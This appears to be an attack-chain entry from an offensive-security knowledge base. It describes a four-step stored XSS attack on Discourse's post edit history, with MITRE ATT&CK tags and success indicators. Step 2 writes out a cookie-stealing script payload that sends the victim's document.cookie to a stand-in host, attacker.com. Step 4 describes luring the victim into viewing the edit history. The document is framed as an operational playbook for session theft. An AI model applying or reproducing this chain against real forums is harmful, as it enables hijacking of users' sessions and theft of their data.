---
tags:
  - xss
  - stored-xss
  - discourse
  - web-exploitation
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Inject-and-Trigger-Stored-XSS-in-Discourse-Edit-History]]'
step_count: 4
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T00:11:09.446Z'
description: >-
  A multi-stage attack exploiting a stored XSS vulnerability in Discourse's post
  edit history to inject and execute malicious JavaScript, enabling session
  theft and arbitrary code execution in victims' browsers.
skill_level: intermediate
impact_level: high
id: 7ead1ab5-6ced-4960-b798-898b92a74166
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Stored XSS in Discourse Post Edit History for Session Hijacking

Multi-stage attack chain demonstrating a complete attack workflow exploiting insufficient sanitization in Discourse's post edit history feature.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initiate Interaction] --> B[Inject Payload]
    B --> C[Trigger Edit History]
    C --> D[Victim Views History]
    D --> E[Payload Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (manual browser-based interaction)

### Target Environment

- Discourse forum (versions up to 1.9 and below 2.0.0 beta6)
- Web browser for attacker and victim
- Access to create posts in private messages or topics

### Initial Access Requirements

- Attacker account on the Discourse instance
- Ability to send private messages or reply in topics
- Victim interaction with the forum (e.g., viewing posts)

## Detailed Attack Procedures

### Step 1: Initiate Private Message or Topic Reply
procedure: [[procedures/Inject-and-Trigger-Stored-XSS-in-Discourse-Edit-History]]

**Objective**: Establish interaction with the victim to set up payload injection.

**Instructions**: Log in to the Discourse instance as the attacker and start a private message with the target victim or reply to an existing topic. For example, navigate to a topic like https://try.discourse.org/t/recommended-reading-for-community-and-foss-enthusiasts/278 and compose a reply.

**Expected Output**: A new post or message thread is created, ready for payload injection.

**Success Indicators**:
- Private message sent or reply posted successfully
- Victim receives notification or can view the post

### Step 2: Inject XSS Payload in Post
procedure: [[procedures/Inject-and-Trigger-Stored-XSS-in-Discourse-Edit-History]]

**Objective**: Embed malicious JavaScript in the post title or content, optionally via image upload, to store the payload.

**Instructions**: In the compose window, upload an image if desired (e.g., a Simpson image) and inject the XSS payload directly into the post title or body. Use a simple payload like `<script>alert('XSS')</script>` or a more advanced one to steal cookies, such as `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`.

**Expected Output**: The post is published with the unsanitized payload embedded.

**Success Indicators**:
- Post appears in the thread without visible errors
- Payload is stored but not yet executed

### Step 3: Edit, Delete, or Restore Post to Populate Edit History
procedure: [[procedures/Inject-and-Trigger-Stored-XSS-in-Discourse-Edit-History]]

**Objective**: Manipulate the post to generate edit history where the payload persists unsanitized.

**Instructions**: After posting, edit the post content slightly, or delete and then restore the post. This action populates the edit history accessible via the yellow pencil icon next to the post.

**Expected Output**: Edit history is created, containing versions of the post with the injected payload.

**Success Indicators**:
- Yellow pencil icon appears next to the post
- Edit history loads without errors on preview

### Step 4: Victim Views Edit History Triggering Execution
procedure: [[procedures/Inject-and-Trigger-Stored-XSS-in-Discourse-Edit-History]]

**Objective**: Lure the victim to view the edit history, executing the stored XSS in their browser.

**Instructions**: Notify or entice the victim to interact with the post (e.g., via forum notification). When the victim clicks the yellow pencil icon to view changes, the payload executes automatically.

**Expected Output**: JavaScript runs in the victim's browser, e.g., an alert box pops up or data is exfiltrated to the attacker's server.

**Success Indicators**:
- Alert or network request to attacker's domain observed
- Victim's cookies or session data stolen

## Attack Chain Summary

### Key Achievements

1. Successful injection of persistent XSS payload in Discourse posts
2. Triggering execution via edit history view, bypassing content sanitization
3. Potential for mass impact in public topics or targeted session theft in private messages

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
